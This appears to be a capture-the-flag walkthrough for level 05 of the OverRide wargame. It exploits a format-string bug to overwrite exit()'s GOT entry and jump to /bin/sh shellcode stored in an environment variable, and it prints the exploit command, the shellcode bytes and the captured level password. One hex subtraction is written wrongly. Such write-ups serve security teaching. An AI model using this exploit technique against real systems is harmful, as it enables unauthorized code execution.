# Level 05

Once logged in, you will see a binary.

```
$ ssh 164.92.144.154 -p 4242 -l level05
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 164.92.144.154:4242
level05@164.92.144.154's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$ ls
level05
```

Okay, let's run the program.

```
level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$ ./level05
AAAAAAAAAAAAAaaaaaaaaaaaAAaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level05@OverRide:~$
```

By looking at the execution result of the program, two things can be observed,
- the uppercase letters will be turned into lower case letters
- if the length of input is too long, the output will only print 99 characters

By looking at the decompiled source (or with GDB), the function uses `printf`, so there is a chance for using format string attack.

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  exit
0x08048370  exit@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

In above, the call for `exit()` is used, and we can overrite the exit() in the GOT(Global Offset Table) section.

To find the GOT address of exit, the following command needs to be proceed:

```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
level05@OverRide:~$
```

We now have an address for exit, `0x080497e0`, we need to provide a payload that overwrites a shellcode.

```
# a shellcode
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

# store create payload that stores shellcode

export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")

```

With the shellcode stored into the environment variable, a program can be writeen to access the address of the shellcode

```
# /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	printf("env address: %p\n", getenv(argv[1]));
	return (0);
}
[...]
level05@OverRide:/tmp$ gcc -m32 getenv.c -o getenv  # for 32bit
level05@OverRide:/tmp$ ./getenv PAYLOAD
env address: 0x7fffffffebbd

### remember, the env. variable will change of the execution point, so let's run the program on different location ###
level05@OverRide:~$ /tmp/getenv PAYLOAD
0xffffdefd
```

We now have address we want(=`exit()`) to overwrite: `0x080497e0`, with the address of the stack `0xffffdefd`

Because the address too big, we overwrite the target 2 bytes each time. (the first 4 bytes of address can be ignored)

for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5(57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`

let's try out

```
level05@OverRide:~$ echo $(python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%57077u%10$hn" + "%8450u%11$hn")') | ./level05
[...]
[...]
[...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
level05@OverRide:~$
```
